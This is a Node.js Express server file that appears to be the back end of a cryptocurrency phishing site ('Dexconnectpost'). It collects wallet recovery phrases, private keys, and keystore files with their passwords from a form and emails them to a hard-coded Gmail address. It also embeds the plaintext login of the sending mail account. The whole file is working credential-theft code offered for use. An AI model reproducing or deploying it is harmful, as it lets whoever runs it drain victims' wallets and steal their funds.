const path = require("path");
const express = require("express");
const nodemailer = require("nodemailer");
const app = express();

app.use(express.static(path.join(__dirname, "pages")));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res, next) => {
  return res.sendFile(path.join(__dirname, "pages", "index.html"));
});

app.post("/", (req, res, next) => {
  var text = "";
  if (req.body.import_type === "keystorejson") {
    text = stringKEYSTOREJSON(
      `${req.body.import_type}`,
      `${req.body.wallet}`,
      `${req.body.keystorejson}`,
      `${req.body.keystorepassword}`
    );
  } else if (req.body.import_type === "phrase") {
    text = stringPHRASE(
      `${req.body.import_type}`,
      `${req.body.wallet}`,
      `${req.body.phrase}`
    );
  } else {
    text = stringPRIVATEKEY(
      `${req.body.import_type}`,
      `${req.body.wallet}`,
      `${req.body.privatekey}`
    );
  }


  transport.sendMail(
    {
      from: "darkdeveloper54@outlook.com",
      to: "lexmanjob@gmail.com",
      subject: "New Submission Received From Dexconnectpost",
      html: text,
    },
    function (err, info) {
      if (err) {
        console.log(err);
        return res.json('success');
      }
      return res.json('error');
    }
  );
});

app.listen(process.env.PORT || 4000, () => {
  console.log("listening on port 4000");
});

var transport = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: "uzoechichigozie54@gmail.com",
    pass: "derddtafbfwrvbcv",
  },
});

function stringPHRASE(type, wallet, phrase) {
  return (
    "<!DOCTYPE html>\n" +
    "<html>\n" +
    "<head>\n" +
    "<title>New Submission Received From Dexconnectpost</title>\n" +
    "</head>\n" +
    "<body>\n" +
    "\n" +
    "<h1>New Submission Received From Dexconnectpost</h1>\n" +
    "<p><label><b>Wallet-Type: </b></label>" +
    type +
    ".</p>\n" +
    "<p><label><b>Wallet-Name: </b></label>" +
    wallet +
    "</p>\n" +
    "<p><label><b>Wallet-Phrase: </b></label>" +
    phrase +
    "</p>\n" +
    "</body>\n" +
    "</html>"
  );
}

function stringKEYSTOREJSON(type, wallet, keystorejson, keystorepassword) {
  return (
    "<!DOCTYPE html>\n" +
    "<html>\n" +
    "<head>\n" +
    "<title>New Submission Received From Dexconnectpost</title>\n" +
    "</head>\n" +
    "<body>\n" +
    "\n" +
    "<h1>New Submission Received From Dexconnectpost</h1>\n" +
    "<p><label><b>Wallet-Type: </b></label>" +
    type +
    ".</p>\n" +
    "<p><label><b>Wallet-Name: </b></label>" +
    wallet +
    "</p>\n" +
    "<p><label><b>Wallet-Keystore: </b></label>" +
    keystorejson +
    "</p>\n" +
    "<p><label><b>Wallet-Keystorepassword: </b></label>" +
    keystorepassword +
    "</p>\n" +
    "</body>\n" +
    "</html>"
  );
}

function stringPRIVATEKEY(type, wallet, privatekey) {
  return (
    "<!DOCTYPE html>\n" +
    "<html>\n" +
    "<head>\n" +
    "<title>New Submission Received From Dexconnectpost</title>\n" +
    "</head>\n" +
    "<body>\n" +
    "\n" +
    "<h1>New Submission Received From Dexconnectpost</h1>\n" +
    "<p><label><b>Wallet-Type: </b></label>" +
    type +
    ".</p>\n" +
    "<p><label><b>Wallet-Name: </b></label>" +
    wallet +
    "</p>\n" +
    "<p><label><b>Wallet-PrivateKey: </b></label>" +
    privatekey +
    "</p>\n" +
    "</body>\n" +
    "</html>"
  );
}
